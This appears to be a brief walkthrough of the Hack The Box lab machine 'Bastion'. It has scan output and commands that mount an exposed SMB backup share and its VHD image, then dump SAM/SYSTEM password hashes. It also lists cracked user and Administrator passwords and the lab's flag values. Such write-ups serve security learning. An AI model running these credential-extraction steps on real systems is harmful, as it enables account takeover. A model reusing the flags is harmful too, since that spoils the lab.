Bastion | 10.10.10.134 | Hackthebox

nmap scan
---------
22/tcp    open  ssh          OpenSSH for_Windows_7.9 (protocol 2.0)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC
49669/tcp open  msrpc        Microsoft Windows RPC
49670/tcp open  msrpc        Microsoft Windows RPC

smbclient -L //10.10.10.134
smbclient //10.10.10.134/Backups

mounting the backups directory
mkdir /mnt/smb
mount -t cifs //10.10.10.134/Backups /mnt/smb

mkdir /mnt/vhd
guestmount --add filename.vhd --inspector -ro -v /mnt/vhd

cd /mnt/vhd/windows/system32/config
SAM and SYSTEM
sumdump2 ./SAM ./SYSTEM

*disabled* Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
*disabled* Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::

* crack the user hash and we get
* L4mpje : bureaulampje

* ssh into L4mpje

-------------------------------------------
user.txt : 9bfe57d5c3309db3a151772f9d86c6cd
-------------------------------------------


Username="Administrator" 
Domain="" 
Password="aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw=="

Administrator : thXLHM96BeKL0ER2

-------------------------------------------
root.txt : 958850b91811676ed6620a9c430e65c8
-------------------------------------------